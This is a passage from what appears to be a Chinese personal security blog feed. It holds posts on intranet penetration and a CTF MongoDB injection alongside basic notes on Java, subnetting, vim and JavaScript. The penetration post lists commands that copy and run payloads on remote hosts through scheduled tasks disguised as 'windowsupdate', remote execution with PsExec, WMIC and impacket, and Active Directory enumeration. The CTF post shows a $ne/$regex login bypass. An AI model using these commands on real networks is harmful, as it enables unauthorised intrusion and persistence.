class="line">at \\<span class="number">10.10</span>.<span class="number">10.20</span> <span class="number">3</span> /delete    <span class="comment">#删除指定计划任务</span></span><br><span class="line">net time \\<span class="number">10.10</span>.<span class="number">10.20</span>    <span class="comment">#查看目标机器时间</span></span><br><span class="line">at \\<span class="number">10.10</span>.<span class="number">10.20</span> <span class="number">18</span>:<span class="number">00</span> \\<span class="number">10.10</span>.<span class="number">10.20</span>\admin<span class="variable">$</span>\hack.bat   <span class="comment">#执行计划任务</span></span><br><span class="line"></span><br><span class="line">xcopy c:\payload.exe \\<span class="number">192.168</span>.<span class="number">1.101</span>\admin<span class="variable">$</span>\temp  <span class="comment">#拷贝payload到远程主机对应目录下</span></span><br><span class="line">at \\<span class="number">192.168</span>.<span class="number">1.101</span> <span class="number">19</span>:<span class="number">30</span> /every:<span class="number">1</span>,<span class="number">5</span> c:\windows\temp\payload.exe <span class="comment">#设定计划任务，每月5,1日的19:30执行命令运行payload</span></span><br></pre></td></tr></table></figure><ul><li>schtasks命令</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 远程IP地址 /ru 指定账户的权限运行任务 /tn 计划名 /tr 指定运行的程序或命令</span><br><span class="line">/st 指定时间 /sc 计划类型</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s <span class="number">192.168</span>.<span class="number">1.102</span> /u “administrator” /p “<span class="number">123</span>!<span class="selector-tag">@</span><span class="comment">#” /RL HIGHEST /tn windowsupdate /tr C:\\Windows\temp\1.bat /sc DAILY /mo 1 /ST 19:30  #创建任务</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /run /s 远程IP地址 /i /tn 计划任务名</span><br><span class="line">schtasks /run /tn windowsupdate /s <span class="number">192.168</span>.<span class="number">1.102</span> /u “administrator” /p “<span class="number">123</span>!<span class="selector-tag">@</span><span class="comment">#”  #运行任务</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /delete /s 远程IP地址 /tn 计划名 /f   <span class="comment">#删除计划任务</span></span><br></pre></td></tr></table></figure><h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p><strong>Windows原生工具</strong></p><ul><li>PsExec(pstools)</li></ul><p>原理是基于IPC共享，目标需要开放445端口和admin$共享</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe –accepteula \\远程IP地址 -s cmd.exe</span><br><span class="line">PsExec.exe \\远程IP地址 -u 账户 –p 密码 cmd.exe</span><br></pre></td></tr></table></figure><p>• -accepteula：使用该参数第一次运行时不会弹出确认框<br>• -s：以System权限运行远程进程<br>• -u：域\用户名<br>• -p：密码</p><ul><li>Wmic</li></ul><p>Wmic,默认所有版本Windows安装, 系统默认不会在日志中记录,推荐使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:目标IP地址 /user:用户名 /password:密码 process call create &quot;cmd.exe /c cmd命令&gt;d:\result.txt&quot;</span><br><span class="line">type \\192.168.182.182\D$\result.txt</span><br></pre></td></tr></table></figure><p><strong>impacket工具包</strong></p><p>impacket远程命令执行工具包含:</p><p>• psexec.py • smbexec.py • atexec.py • wmiexec.py</p><ul><li>psexec.py</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psexec.py [domain/] username [: password] @ [Target IP Address]</span><br><span class="line">• 在工作组环境下：psexec.py 用户名:密码@目标IP 要执行命令</span><br><span class="line">• 在域环境下： psexec.py 域名/用户名:密码@目标IP 要执行的命令</span><br></pre></td></tr></table></figure><ul><li>wmiexec</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py [domain/] username [: password] @ [Target IP Address]</span><br><span class="line">• 在工作组环境下：wmiexec.py 用户名:密码@目标IP 要执行命令</span><br><span class="line">• 在域环境下： wmiexec.py 域名/用户名:密码@目标IP 要执行的命令</span><br></pre></td></tr></table></figure><h1 id="Active-Directory-amp-LDAP"><a href="#Active-Directory-amp-LDAP" class="headerlink" title="Active Directory&amp;LDAP"></a>Active Directory&amp;LDAP</h1><p>AD（Active Directory）活动目录,是一种基于数据库的系统，可在windows环境中提供身份验证、目录、策略和其他服务.</p><p>LDAP（轻量级目录访问协议）则提供查询和修改目录服务及程序中的项目应用协议</p><p><strong>ldapsearch工具</strong></p><p>利用ldapsearch信息搜集</p><p>能访问DC的389端口，且已经知道一个域内账户的账号密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ldap-ut    <span class="comment">#安装</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -D <span class="string">&quot;ls@ichunqiu.com&quot;</span> -w <span class="string">&quot;123.com&quot;</span> -p 389 -h 10.10.10.20 -b </span><br><span class="line"><span class="string">&quot;DC=ichunqiu,DC=com&quot;</span> <span class="string">&quot;(&amp;(objectClass=user)(objectCategory=person))&quot;</span> | grep ^cn        <span class="comment">#查看用户名</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -D <span class="string">&quot;ls@ichunqiu.com&quot;</span> -w <span class="string">&quot;123.com&quot;</span> -p 389 -h 10.10.10.20 -b</span><br><span class="line"><span class="string">&quot;DC=ichunqiu,DC=com&quot;</span> <span class="string">&quot;(&amp;(objectClass=computer)(objectCategory=computer))&quot;</span> | grep ^cn  <span class="comment">#查询计算机名</span></span><br><span class="line"></span><br><span class="line">ldapsearch -x -D <span class="string">&quot;ls@ichunqiu.com&quot;</span> -w <span class="string">&quot;123.com&quot;</span> -p 389 -h 10.10.10.20 -b</span><br><span class="line"><span class="string">&quot;DC=ichunqiu,DC=com&quot;</span> <span class="string">&quot;(&amp;(objectClass=computer)(objectCategory=computer))&quot;</span> | grep ^cn  <span class="comment">#查询域内组</span></span><br><span class="line"></span><br><span class="line">参数说明：-x 进行简单认证；-H 服务器地址；-D 用来绑定服务器的DN；-w 绑定DN的密码；-b 指定要查询的根节点</span><br></pre></td></tr></table></figure><h2 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h2><p>• 服务主体名称（SPN:Service Principal Names）是服务实例，可以将其理解为一个服务（比如 HTTP、MSSQL）的<br>唯一标识符，服务在加入域中时是自动注册的。简单来说： SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN，如果想使用Kerberos协议来认证服务，那么必须正确配置 SPN,在Active Directory环境中发现服务的最佳方法是通过“SPN扫描”</p><ol><li>SPN扫描可以发现重要的服务器机器，如：终端、交换机、邮服、数据库之类;不需要进行主动扫描相比之下隐蔽性更高</li><li>所有的域用户都可以通过LDAP获取到域内所有SPN，进而通过Kerberoasting攻击完成域内提权等</li><li>在获得SPN修改权限后可以为指定域用户添加SPN，通过随时获取该用户的TGS破解明文密码，作为域内持久化手段</li></ol><ul><li><strong>SPN格式</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;service <span class="class"><span class="keyword">class</span>&gt;/&lt;<span class="title">host</span>&gt;:&lt;<span class="title">port</span>&gt; &lt;<span class="title">servicename</span>&gt;</span></span><br><span class="line"><span class="class">#服务类型 / 对应机器名:服务端口号 服务名</span></span><br><span class="line"><span class="class">#其中服务类和主机是必需参数，端口和服务名为可选</span></span><br></pre></td></tr></table></figure><ul><li><strong>setspn命令(系统自带)</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setspn –q */*           <span class="comment">#来查询当前域下的所有SPN</span></span><br><span class="line">setspn –T 域名 –q */*   <span class="comment">#查看指定域的所有SPN</span></span><br></pre></td></tr></table></figure><ul><li><strong>adfind.exe工具</strong></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe <span class="literal">-sc</span> dclist    <span class="comment">#列出域控的名称</span></span><br><span class="line">AdFind.exe <span class="literal">-schema</span> <span class="literal">-s</span> base objectv                             <span class="comment">#查看域控的版本</span></span><br><span class="line">AdFind.exe <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSyste    <span class="comment">#查询当前域中所有计算机</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java基础</title>
      <link href="/posts/61982/"/>
      <url>/posts/61982/</url>
      
        <content type="html"><![CDATA[<h3 id="编辑中"><a href="#编辑中" class="headerlink" title="编辑中 ~~~~~~"></a>编辑中 ~~~~~~</h3><p>没有new怎么调用？</p><p>1.静态函数用类名调用</p><p>2.反射实例化对象调用</p><p>static关键字的意思是静态的，也称为“类的”。可以用来修饰类的成员变量和（成员）方法。这些被static修饰的变量或者方法称为静态变量或者静态方法，也叫类变量或者类方法。这一类的变量和方法，不需要new出类的实例就可以调用，直接使用类名进行调用。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mongodb 永真注入</title>
      <link href="/posts/60365/"/>
      <url>/posts/60365/</url>
      
        <content type="html"><![CDATA[<p>判断注入 账号密码处加[$ne] 如果返回页面成功机存在永真注入.</p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217201212473.png" alt="image-20220217201212473"></p><p>跑出账号为admin</p><p>匹配字典为:!@#$%^&amp;*()[]&lt;&gt;QWERTYUIOPASDFGHJKLZXCVBNMzxcvbnmasdfghjklqwertyuiop</p><p>然后换logpass处 继续一个字母一个字母进行匹配,相当于文档的里的<strong>正则关键字匹配查找</strong>.</p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217202213538.png" alt="image-20220217202213538"></p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217202317259.png" alt="image-20220217202317259"></p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217202531280.png" alt="image-20220217202531280"></p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217202504356.png" alt="image-20220217202504356"></p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217202705563.png" alt="image-20220217202705563"></p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217202733986.png" alt="image-20220217202733986"></p><p>判断结束</p><p><img src="C:/Users/zlb/AppData/Roaming/Typora/typora-user-images/image-20220217202822743.png" alt="image-20220217202822743"></p><p>logname=admin&amp;logpass[$regex]=^flag{djhd-fhei3-29ij-9iok}$§a§&amp;submit=%E7%99%BB%E5%BD%95</p><p>账号密码为</p><p>admin  密码:flag{djhd-fhei3-29ij-9iok}</p><p><img src="E:/bstark-blog/source/_posts/image-20220217202922548.png" alt="image-20220217202922548"></p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子网掩码计算</title>
      <link href="/posts/49563/"/>
      <url>/posts/49563/</url>
      
        <content type="html"><![CDATA[<p>二进制转换表：</p><table><thead><tr><th>128</th><th>64</th><th>32</th><th>16</th><th>8</th><th>4</th><th>2</th><th>1</th></tr></thead><tbody><tr><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td></tr></tbody></table><p>如果值全为1，上面的数字全部相加等于255.</p><blockquote><p>例如<br>已知ip ：           141.14.72.24<br>已知子网掩码：255.255.255.128<br>求网段地址？</p></blockquote><table><thead><tr><th>目标IP</th><th>141</th><th>14</th><th>72</th><th>24</th></tr></thead><tbody><tr><td>目标ip二进制</td><td>10001101</td><td>00001110</td><td>01001000</td><td>00011000</td></tr><tr><td>子网掩码</td><td>11111111</td><td>11111111</td><td>11111111</td><td>10000000</td></tr><tr><td>最小ip范围</td><td><strong>1</strong>000<strong>11</strong>0<strong>1</strong></td><td>0000<strong>111</strong>0</td><td>0<strong>1</strong>00<strong>1</strong>000</td><td>00000000</td></tr></tbody></table><p>算最小ip范围取相同1</p><table><thead><tr><th>目标ip</th><th>141</th><th>14</th><th>72</th><th>24</th></tr></thead><tbody><tr><td>目标ip二进制</td><td>10001101</td><td>00001110</td><td>01001000</td><td>00011000</td></tr><tr><td>子网掩码</td><td><strong>11111111</strong></td><td><strong>11111111</strong></td><td><strong>11111111</strong></td><td><strong>1</strong>0000000</td></tr><tr><td>最大ip范围*</td><td>10001101</td><td>00001110</td><td>01001000</td><td>0<strong>1111111</strong></td></tr></tbody></table><p>*注：最大ip范围取目标前三段不变。</p><p>算最大ip范围，子网掩码相同的全部为不变，后面全填写1</p><p>最后转2进制得：</p><p>最小：141.14.72.0</p><p>最大：141.14.72.127</p><p>去掉一个广播地址：141.14.72.127</p><p>范围即是：141.14.72.0——141.14.72.127</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211222143630714.png" alt="image-20211222143630714"></p><p>141.14.72.24</p><p>255.255.192.0</p><p>子网掩码为</p><p>子网掩码<strong>11111111  1111111  11</strong>000000   0000000</p><p>最小子网10001101  0001110  01000000  0000000</p><p>最大子网10001101  0001110  0<strong>1111111  1111111</strong></p><p>即：</p><p>最大子网:141.14.64.0</p><p>最小子网:141.14.127.255</p><p>10.50.89.60/18</p><p>00001010     00110010    01011001   11111100</p><p>11111111     11111111    11000000   00000000</p><p>10.50.64.0</p><p>10.50.127.2</p><p>11111111 11111111 11111111 11111100</p>]]></content>
      
      
      
        <tags>
            
            <tag> 子网掩码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VIM基础使用</title>
      <link href="/posts/819/"/>
      <url>/posts/819/</url>
      
        <content type="html"><![CDATA[<p>VIM基础使用</p><pre><code> VI/VIM共有三种编辑模式，分别是：命令模式（Command mode）、输入模式（Insert mode）和底线命令模式（Last line mode）。</code></pre><h4 id="底线命令模式："><a href="#底线命令模式：" class="headerlink" title="底线命令模式："></a>底线命令模式：</h4><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211219200543758.png" alt="image-20211219200543758"></p><p>​    在命令模式下按：（英文冒号）就进入了底线命令模式。底线命令模式可以输入单个或多个字符命令在底线模式中，基本命令有：<br>◆ ESC：退出底线命令模式，切换到命令模式</p><table><thead><tr><th>底线命令模式</th><th>作用</th></tr></thead><tbody><tr><td>:w</td><td>将编辑的数据写入硬盘档案中(常用)</td></tr><tr><td>:w!</td><td>若文件属性为『只读』时，强制写入该档案。不过，到底能不能写入， 还是跟你对 该档案的档案权限有关啊！</td></tr><tr><td>:q</td><td>离开 vi (常用)</td></tr><tr><td>:q!</td><td>若曾修改过档案，又不想储存，使用 ! 为强制离开不储存档案。</td></tr><tr><td>:wq</td><td>储存后离开，若为 :wq! 则为强制储存后离开 (常用)</td></tr><tr><td>:n1,n2 w [filename]</td><td>将 n1 到 n2 的内容储存成 filename 这个档案。</td></tr><tr><td>:! command</td><td>暂时离开 vi 到指令行模式下执行 command 的显示结果。</td></tr></tbody></table><table><thead><tr><th>行号变更</th><th>作用</th></tr></thead><tbody><tr><td>:set nu</td><td>显示行号，设定之后，会在每一行的前缀显示该行的行号</td></tr><tr><td>:set nonu</td><td>与 set nu 相反，为取消行号！</td></tr></tbody></table><h4 id="一般模式"><a href="#一般模式" class="headerlink" title="一般模式"></a>一般模式</h4><table><thead><tr><th>光标移动方法</th><th>作用</th></tr></thead><tbody><tr><td>[Ctrl] + [f]</td><td>屏幕『向下』移动一页，相当于 [Page Down]按键 (常用)</td></tr><tr><td>[Ctrl] + [b]</td><td>屏幕『向上』移动一页，相当于 [Page Up] 按键 (常用)</td></tr><tr><td>0</td><td>或功能键[Home] 这是数字『 0 』：移动到光标所在行头</td></tr><tr><td>$</td><td>或功能键[End] 移动到这一行的行尾(常用)</td></tr><tr><td>G</td><td>移动到文档的最后一行(常用)</td></tr><tr><td>gg</td><td>移动到文档的第一行 (常用)</td></tr><tr><td>n<Enter></td><td>n 为数字。光标向下移动 n 行(常用)</td></tr></tbody></table><h5 id="一般模式下搜索替换指令说明："><a href="#一般模式下搜索替换指令说明：" class="headerlink" title="一般模式下搜索替换指令说明："></a>一般模式下搜索替换指令说明：</h5><table><thead><tr><th>搜索替换指令</th><th>作用</th></tr></thead><tbody><tr><td>/word</td><td>向光标之下查找为 word 的字符串。 (常用)</td></tr><tr><td>?word</td><td>向光标之上查找字为 word 的字符串。</td></tr><tr><td>n</td><td>这个 n 是英文按键。代表重复前一个搜寻的动作。</td></tr><tr><td>N</td><td>这个 N 是英文按键。与 n 刚好相反，为『反向』进行前一个搜寻动作</td></tr><tr><td><strong>:n1,n2s/word1/word2/g</strong></td><td><strong>n1 与 n2 为数字。在第 n1 与 n2 行之间寻找 word1 这个字符串，并将该字符串取代为word2</strong></td></tr><tr><td><em><strong>:1,$s/word1/word2/g 或 :%s/word1/word2/g</strong></em></td><td><em><strong>从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！</strong></em></td></tr><tr><td>:1,$s/word1/word2/gc 或 :%s/word1/word2 /gc</td><td>从第一行到最后一行寻找 word1 字符串，并将该字符串取代为 word2 ！且在取代前显示提示字符给用户确认 (confirm) 是否需要取代！(常用)</td></tr></tbody></table><h5 id="一般模式下删除、复制与粘贴常用方法说明："><a href="#一般模式下删除、复制与粘贴常用方法说明：" class="headerlink" title="一般模式下删除、复制与粘贴常用方法说明："></a>一般模式下删除、复制与粘贴常用方法说明：</h5><table><thead><tr><th>删除、复制与粘贴方法</th><th>作用</th></tr></thead><tbody><tr><td>x, X</td><td>在一行字当中，x 为向后删除一个字符 (相当于 [del] 按键)， X 为向前删除一个字符(相当于 [backspace] 亦即是退格键) (常用)  向光标前删除，向光标后删除</td></tr><tr><td>dd</td><td>删除游标所在的那一整行(常用</td></tr><tr><td>ndd</td><td>n 为数字。删除光标所在的向下 n 行，例如</td></tr><tr><td>yy</td><td>复制游标所在的那一行(常用)</td></tr><tr><td>nyy</td><td>n 为数字。复制光标所在的向下 n 行，例如 20yy 则是复制 20 行(常用)</td></tr><tr><td>p, P</td><td>p 为将已复制的数据在光标下一行贴上，P 则为贴在游标上一行！</td></tr><tr><td>u</td><td>复原前一个动作。(常用)</td></tr><tr><td>[Ctrl]+r</td><td>重做上一个动作。(常用)</td></tr><tr><td>.</td><td>不要怀疑！这就是小数点！意思是重复前一个动作的意思。 如果你想要重复删除、重复贴上等等动作，按下小数点『.』就好了！ (常用)</td></tr></tbody></table><h5 id="一般模式切换到编辑模式的方法说明："><a href="#一般模式切换到编辑模式的方法说明：" class="headerlink" title="一般模式切换到编辑模式的方法说明："></a>一般模式切换到编辑模式的方法说明：</h5><table><thead><tr><th>进入输入和取代模式方法</th><th>作用</th></tr></thead><tbody><tr><td>i, I</td><td>进入输入模式(Insert mode)：i 为『从目前光标所在处输入』， I 为『在目前所在行的第一个非空格符处开始输入』。(常用)</td></tr><tr><td>a, A</td><td>进入输入模式(Insert mode)：a 为『从目前光标所在的下一个字符处开始输入』， A 为『从光标所在行的最后一个字符处开始输入』。(常用)</td></tr><tr><td>o, O</td><td>进入输入模式(Insert mode)：o光标所在行后新开行,O光标所在行头新开行</td></tr><tr><td>r, R</td><td>进入取代模式(Replace mode)：r 只会取代光标所在的那一个字符一次；R会一直取代光标所在的文字，直到按下 ESC 为止；(常用)</td></tr><tr><td>[Esc]</td><td>退出编辑模式，回到一般模式中(常用)</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础</title>
      <link href="/posts/53226/"/>
      <url>/posts/53226/</url>
      
        <content type="html"><![CDATA[<h2 id="常用调试方法"><a href="#常用调试方法" class="headerlink" title="常用调试方法"></a>常用调试方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(x)</span><br><span class="line"><span class="built_in">document</span>.write(q);</span><br><span class="line"><span class="built_in">window</span>.alert(q);</span><br><span class="line"><span class="built_in">window</span>.confirm(确认)；</span><br><span class="line"><span class="built_in">window</span>.prompt(输入)；</span><br><span class="line"><span class="built_in">console</span>.log(q);</span><br><span class="line"><span class="built_in">console</span>.info(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.error(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.debug(<span class="number">2</span>);</span><br></pre></td></tr></table></figure><h2 id="常用跳转方法"><a href="#常用跳转方法" class="headerlink" title="常用跳转方法"></a>常用跳转方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href=<span class="string">&#x27;index.html&#x27;</span>;</span><br><span class="line"><span class="built_in">window</span>.history.back(-<span class="number">1</span>);</span><br><span class="line"><span class="built_in">window</span>.location=<span class="string">&#x27;index.html&#x27;</span></span><br><span class="line"><span class="attr">javascript</span>:location.href=<span class="string">&quot;index.html&quot;</span>;</span><br><span class="line">onclick=<span class="string">&quot;window.location.href=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">onclick=<span class="string">&quot;javascript:window.location.href=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">onclick=<span class="string">&quot;location=&#x27;index.html&#x27;&quot;</span></span><br><span class="line">top.location=<span class="string">&#x27;html&#x27;</span>;</span><br><span class="line">self.location=<span class="string">&#x27;html&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="数据类型及数学运算"><a href="#数据类型及数学运算" class="headerlink" title="数据类型及数学运算"></a>数据类型及数学运算</h2><ul><li><em><strong>变量名只能包含字母、数字、下划线、$。并且对大小写敏感</strong></em></li></ul><p>eg:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"> <span class="keyword">var</span> b = <span class="number">3</span>;</span><br><span class="line"> <span class="keyword">var</span> c = <span class="number">4</span>;</span><br><span class="line"> <span class="keyword">var</span> d = <span class="string">&quot;122hello world！333&quot;</span>;  </span><br><span class="line"><span class="comment">//多个字符组合叫字符串，字符型用单引号或者双引号</span></span><br><span class="line"> <span class="keyword">var</span> e = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"> <span class="keyword">var</span> q= a+b;  <span class="comment">//加+减-乘*除/</span></span><br><span class="line"> </span><br><span class="line"> a--; <span class="comment">//自减 1</span></span><br><span class="line"> --a; <span class="comment">//自减 1</span></span><br><span class="line"> a++; <span class="comment">//自加 1</span></span><br><span class="line"> ++a; <span class="comment">//自加 1</span></span><br><span class="line"> a=b; <span class="comment">//赋值  把B赋值给A，把后面的赋值给前面的。</span></span><br><span class="line"> a-=b; </span><br><span class="line"> a+=b; <span class="comment">//相当于a=a+b</span></span><br><span class="line"> sum+=i<span class="comment">//相当于sum=sum+i</span></span><br><span class="line"> a*=b;</span><br><span class="line"> a/=b;<span class="comment">//相当于 a=a/b,同上</span></span><br><span class="line"> a%b   <span class="comment">//取余</span></span><br><span class="line"> <span class="literal">true</span> &amp;&amp; <span class="literal">false</span> = <span class="literal">false</span><span class="comment">//与运算   ?与或非运算。    </span></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">var</span> a=<span class="number">10</span>；</span><br><span class="line"> x=a++   </span><br><span class="line"> x=++a</span><br></pre></td></tr></table></figure><ul><li><em><strong>自增自减运算</strong></em></li></ul><p> 自增运算符(一种算数运算符)<br> <em><strong>a++:表示的是a=a+1,先赋值后运算<br> ++a:表示的是a=a+1,先运算后赋值</strong></em><br>i++返回的是自增之前的值，++i返回的是自增后的值。</p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> a=<span class="number">2</span>             </span><br><span class="line"><span class="keyword">var</span> y=a++; </span><br><span class="line"><span class="keyword">var</span> x=++a;</span><br><span class="line"></span><br><span class="line"><span class="comment">//y=2</span></span><br><span class="line"><span class="comment">//x=3</span></span><br><span class="line">alert(x);                    </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><ul><li><em><strong>if…else..</strong></em>.</li></ul><p>eg:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age =<span class="number">20</span>;</span><br><span class="line"><span class="keyword">if</span>(age&gt;=<span class="number">18</span>)</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="built_in">document</span>.write(<span class="string">&#x27;已成年&#x27;</span>)   </span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line">      dochument.write(<span class="string">&quot;未成年&quot;</span>)        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>if…else if… else</strong></em> </li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> age = prompt(<span class="string">&quot;输入您的年龄&quot;</span>);  </span><br><span class="line">   <span class="keyword">if</span>(age&gt;=<span class="number">18</span>)<span class="comment">//条件1true</span></span><br><span class="line">   &#123;</span><br><span class="line">     alert(<span class="string">&quot;已成年&quot;</span>) ;  </span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (age&gt;=<span class="number">0</span>&amp;&amp;age&lt;=<span class="number">18</span>)<span class="comment">//条件2true </span></span><br><span class="line">   &#123;</span><br><span class="line">     alert(<span class="string">&quot;未成年&quot;</span>) ;       </span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//false</span></span><br><span class="line">    &#123;</span><br><span class="line">    alert(<span class="string">&quot;输入错误&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>*** if…else if…else if…else if…else***</li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> count = prompt(<span class="string">&quot;输入您的成绩&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (count &gt;= <span class="number">90</span> &amp;&amp; count &lt;= <span class="number">100</span>)&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为A&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (count 